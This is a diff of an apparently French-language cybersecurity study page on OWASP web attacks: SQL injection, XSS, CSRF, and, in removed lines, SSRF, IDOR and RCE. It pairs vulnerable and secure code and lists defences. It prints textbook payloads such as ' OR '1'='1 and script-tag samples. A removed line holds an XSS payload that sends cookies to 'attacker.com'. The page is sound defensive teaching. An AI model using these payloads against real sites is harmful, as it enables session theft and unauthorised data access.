@@ -4,204 +4,134 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Attaques Web | Mémo Cybersécurité</title>
-    <meta name="description"
-        content="Guide sur les attaques Web (OWASP Top 10) : SQL Injection, XSS, SSRF, IDOR et comment s'en protéger.">
+    <title>Web Attacks (OWASP) | Mémo Cybersécurité</title>
+    <meta name="description" content="Comprendre les failles Web : Injection SQL, XSS, CSRF et comment les sécuriser.">
     <meta name="theme-color" content="#303030">
     <link
         href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&family=Outfit:wght@300;400;500;600;700&display=swap"
         rel="stylesheet">
     <link rel="stylesheet" href="../assets/css/style.css">
-    <link rel="stylesheet" href="../assets/css/quiz-style.css">
 </head>
 
-<body>
-    <header></header>
+<body class="bg-dots">
+    <header class="glass-header"></header>
 
     <main>
-        <!-- MODULE 01: ATTAQUES WEB ÉTENDUES -->
+        <!-- MODULE 01: WEB ATTACKS -->
         <section id="m1" class="module-section">
             <div class="container">
                 <div class="sec-header">
-                    <div class="sec-num bg-red-soft text-red-dark border-red">01</div>
+                    <div class="sec-num bg-red text-white border-red">01</div>
                     <div>
-                        <h2 class="sec-title text-red-dark">Attaques Web</h2>
-                        <p class="sec-sub">OWASP Top 10 : Comprendre pour Défendre</p>
+                        <h2 class="sec-title gradient-text-primary">Web Attacks</h2>
+                        <p class="sec-sub">OWASP Top 10 : Les classiques indémodables.</p>
                     </div>
                 </div>
 
-                <!-- INTRO M1 -->
-                <div class="intro-box border-left-red bg-red-soft">
-                    <h4 class="text-red">🌍 Le Web : La Surface d'Attaque n°1</h4>
-                    <p>
-                        Le web est la porte d'entrée la plus exposée. Les applications sont complexes et les erreurs
-                        humaines fréquentes.
-                        L'<strong>OWASP Top 10</strong> recense les vulnérabilités les plus critiques qu'il faut
-                        absolument
-                        maîtriser pour ne pas laisser les clés sous le paillasson.
+                <!-- TL;DR -->
+                <div class="tip border-left-red glass-panel mb-40">
+                    <strong class="text-red">📌 En Bref</strong>
+                    <p class="mt-5 fs-0-9">
+                        Le Web est la surface d'attaque la plus exposée. La règle d'or : <strong>Ne jamais faire
+                            confiance aux données utilisateur (User Input).</strong>
+                        Toujours valider, filtrer et échapper les données entrantes ET sortantes.
                     </p>
                 </div>
 
-                <div class="attack-grid">
+                <!-- 1. SQL INJECTION -->
+                <div class="glass-panel p-20 border-left-red-dark mb-40">
+                    <div class="flex-between">
+                        <h3 class="text-red-dark m-0">💉 Injection SQL (SQLi)</h3>
+                        <span class="fw-bold text-muted text-uppercase fs-0-8">Impact: Critique</span>
+                    </div>
+                    <p class="mt-10 mb-20 text-muted">L'attaquant manipule la requête SQL pour accéder à des données non
+                        autorisées.</p>
 
-                    <!-- SQL INJECTION -->
-                    <div class="attack-detail-card">
-                        <div class="attack-header">
-                            <h3 class="text-red">💉 SQL Injection (SQLi)</h3>
-                            <span class="fs-1-5">🗄️</span>
+                    <!-- Do's and Don'ts Code -->
+                    <div class="do-dont-grid">
+                        <div class="dont-box">
+                            <strong class="text-red block mb-10">❌ VULNÉRABLE (Concaténation)</strong>
+                            <pre class="fs-0-8 text-white bg-black p-10 br-6">
+// PHP
+$user = $_POST['user'];
+$query = "SELECT * FROM users 
+          WHERE name = '" . <span class="text-red">$user</span> . "'";
+
+// Attaque: ' OR '1'='1
+// Result: SELECT * FROM users ...</pre>
                         </div>
-                        <div class="attack-body">
-                            <p>L'attaquant manipule une requête SQL pour voler ou détruire la base de données.</p>
-                            <details class="code-reveal">
-                                <summary class="reveal-btn">Voir l'exemple concret</summary>
-                                <div class="code-block">
-                                    <div class="code-bad">
-                                        // ❌ VULNÉRABLE<br>
-                                        query = "SELECT * FROM users WHERE id = " + userInput;
-                                        <br><span class="text-blue">// Si userInput = "1 OR 1=1", il dump tout !</span>
-                                    </div>
-                                    <div class="code-good">
-                                        // ✅ SÉCURISÉ (Prepared Statements)<br>
-                                        query = "SELECT * FROM users WHERE id = ?";<br>
-                                        db.execute(query, [userInput]);
-                                    </div>
-                                </div>
-                            </details>
+                        <div class="do-box">
+                            <strong class="text-green block mb-10">✅ SÉCURISÉ (Prepared Statements)</strong>
+                            <pre class="fs-0-8 text-white bg-black p-10 br-6">
+// PHP (PDO)
+$stmt = $pdo->prepare(
+    "SELECT * FROM users WHERE name = <span class="text-green">:name</span>"
+);
+$stmt->execute(['name' => $user]);
+
+// Le driver échappe l'input auto.</pre>
                         </div>
                     </div>
-
-                    <!-- XSS -->
-                    <div class="attack-detail-card">
-                        <div class="attack-header">
-                            <h3 class="text-red">🎭 XSS (Cross-Site Scripting)</h3>
-                            <span class="fs-1-5">🌐</span>
-                        </div>
-                        <div class="attack-body">
-                            <p>Injection de scripts JS malveillants exécutés dans le navigateur de la victime.</p>
-                            <details class="code-reveal">
-                                <summary class="reveal-btn">Voir l'exemple concret</summary>
-                                <div class="code-block">
-                                    <div class="code-bad">
-                                        // ❌ VULNÉRABLE (React/Vanilla)<br>
-                                        div.innerHTML = userComment;<br>
-                                        <span class="text-blue">// Si userComment =
-                                            "&lt;script&gt;stealCookies()&lt;/script&gt;"</span>
-                                    </div>
-                                    <div class="code-good">
-                                        // ✅ SÉCURISÉ (Sanitization)<br>
-                                        div.innerText = userComment;<br>
-                                        // ou utiliser DOMPurify
-                                    </div>
-                                </div>
-                            </details>
-                        </div>
-                    </div>
-
-                    <!-- BROKEN ACCESS CONTROL -->
-                    <div class="attack-detail-card">
-                        <div class="attack-header">
-                            <h3 class="text-red">🚪 Broken Access (IDOR)</h3>
-                            <span class="fs-1-5">🚫</span>
-                        </div>
-                        <div class="attack-body">
-                            <p>Un utilisateur accède aux données d'un autre en changeant simplement l'ID.</p>
-                            <details class="code-reveal">
-                                <summary class="reveal-btn">Voir l'exemple concret</summary>
-                                <div class="code-block">
-                                    <div class="code-bad">
-                                        // ❌ URL modifiable : /profile?id=123<br>
-                                        // Je change en /profile?id=1 (Admin ?)
-                                    </div>
-                                    <div class="code-good">
-                                        // ✅ SÉCURISÉ<br>
-                                        if (currentUser.id !== request.id) {<br>
-                                        throw new Error("403 Forbidden");<br>
-                                        }
-                                    </div>
-                                </div>
-                            </details>
-                        </div>
-                    </div>
-
-                    <!-- SECURITY MISCONFIG -->
-                    <div class="attack-detail-card">
-                        <div class="attack-header">
-                            <h3 class="text-red">⚙️ Misconfiguration</h3>
-                            <span class="fs-1-5">⚠️</span>
-                        </div>
-                        <div class="attack-body">
-                            <p>Erreurs par défaut, logs verbeux, ou services inutiles exposés.</p>
-                            <details class="code-reveal">
-                                <summary class="reveal-btn">Voir l'exemple concret</summary>
-                                <div class="code-block">
-                                    <ul class="clean-list">
-                                        <li>❌ Laisser `admin/admin` par défaut.</li>
-                                        <li>❌ Afficher les Stack Traces complètes aux utilisateurs.</li>
-                                        <li>❌ Laisser le port 22 (SSH) ouvert à tous (0.0.0.0/0).</li>
-                                        <li class="text-green mt-10">✅ Hardening : Désactiver tout ce qui est
-                                            inutile.</li>
-                                    </ul>
-                                </div>
-                            </details>
-                        </div>
-                    </div>
-
                 </div>
 
-                <!-- DETAILED ATTACKS GRID -->
-                <h3 class="section-subtitle mt-30">🕵️ Autres Vecteurs Critiques</h3>
-                <div class="grid2">
-                    <div class="tool-card p-15">
-                        <details>
-                            <summary class="text-red bold cursor-pointer">🎭 XSS (Cross-Site Scripting)
-                            </summary>
-                            <div class="details-content mt-10 fs-0-9">
-                                <p>Execution de JS dans le navigateur de la victime. Vol de session (Cookies).</p>
-                                <div class="code mt-5 fs-0-8">
-                                    &lt;script&gt;fetch('attacker.com?cookie='+document.cookie)&lt;/script&gt;
-                                </div>
-                            </div>
-                        </details>
+                <!-- 2. XSS -->
+                <div class="glass-panel p-20 border-left-orange mb-40">
+                    <div class="flex-between">
+                        <h3 class="text-orange m-0">🎭 Cross-Site Scripting (XSS)</h3>
+                        <span class="fw-bold text-muted text-uppercase fs-0-8">Impact: Élevé</span>
+                    </div>
+                    <p class="mt-10 mb-20 text-muted">Injection de JavaScript malveillant qui s'exécute dans le
+                        navigateur de la victime.</p>
+
+                    <div class="grid2 gap-20">
+                        <div class="attack-card">
+                            <h4 class="text-orange fs-1">Reflected XSS</h4>
+                            <p class="fs-0-85 text-muted">Le script est dans l'URL (Lien piégé).</p>
+                            <code
+                                class="block mt-10 p-5 bg-black fs-0-7 text-white">site.com?search=&lt;script&gt;alert(1)&lt;/script&gt;</code>
+                        </div>
+                        <div class="attack-card">
+                            <h4 class="text-red fs-1">Stored XSS</h4>
+                            <p class="fs-0-85 text-muted">Le script est stocké en BDD (Commentaire, Profil).</p>
+                            <code
+                                class="block mt-10 p-5 bg-black fs-0-7 text-white">Bonjour &lt;script&gt;stealCookies()&lt;/script&gt;</code>
+                        </div>
                     </div>
 
-                    <div class="tool-card p-15">
-                        <details>
-                            <summary class="text-orange bold cursor-pointer">👺 SSRF (Server Request Forgery)
-                            </summary>
-                            <div class="details-content mt-10 fs-0-9">
-                                <p>Forcer le serveur à attaquer le réseau interne.</p>
-                                <div class="code mt-5 fs-0-8">
-                                    GET /fetch?url=http://localhost/admin
-                                </div>
-                            </div>
-                        </details>
+                    <div class="tip border-left-green bg-green-soft mt-20">
+                        <strong class="text-green">🛡️ Défense</strong>
+                        <p class="fs-0-9 mt-5">
+                            Échapper les données à l'affichage (Output Encoding). <br>
+                            En React/Vue/Angular, c'est automatique par défaut. En PHP :
+                            <code>htmlspecialchars()</code>.
+                        </p>
+                    </div>
+                </div>
+
+                <!-- 3. CSRF -->
+                <div class="glass-panel p-20 border-left-yellow">
+                    <h3 class="text-yellow m-0">🔄 CSRF (Cross-Site Request Forgery)</h3>
+                    <p class="mt-10 text-muted">Forcer l'utilisateur à exécuter une action à son insu (ex: changer son
+                        mot de passe).</p>
+
+                    <div class="analogy-box mt-20">
+                        <h4 class="text-yellow">📬 Analogie</h4>
+                        <p class="fs-0-9">
+                            L'attaquant envoie une lettre à votre banque signée de VOTRE main (votre cookie de session
+                            valide) demandant un virement. La banque l'exécute car la signature est vraie.
+                        </p>
                     </div>
 
-                    <div class="tool-card p-15">
-                        <details>
-                            <summary class="text-blue bold cursor-pointer">🆔 IDOR (Direct Object Ref)
-                            </summary>
-                            <div class="details-content mt-10 fs-0-9">
-                                <p>Changer un ID dans l'URL pour voir la facture du voisin.</p>
-                                <div class="code mt-5 fs-0-8">
-                                    GET /invoice/123 ➔ GET /invoice/124
-                                </div>
-                            </div>
-                        </details>
+                    <div class="info mt-20">
+                        <strong>Solution : Anti-CSRF Token.</strong> Un jeton secret unique généré à chaque formulaire,
+                        que l'attaquant ne peut pas deviner.
                     </div>
+                </div>
 
-                    <div class="tool-card p-15">
-                        <details>
-                            <summary class="text-red-dark bold cursor-pointer">📡 RCE (Remote Code Exec)
-                            </summary>
-                            <div class="details-content mt-10 fs-0-9">
-                                <p>L'attaquant exécute des commandes Shell sur le serveur.</p>
-                                <div class="code mt-5 fs-0-8">
-                                    System.exec(userInput)
-                                </div>
-                            </div>
-                        </details>
-                    </div>
+                <!-- NAV BUTTONS -->
+                <div class="flex-between mt-50">
+                    <a href="m00_fundamentals.html" class="btn-secondary">← Fondamentaux</a>
+                    <a href="m02_cryptography.html" class="btn-primary">Suivant : Cryptographie →</a>
                 </div>
             </div>
         </section>
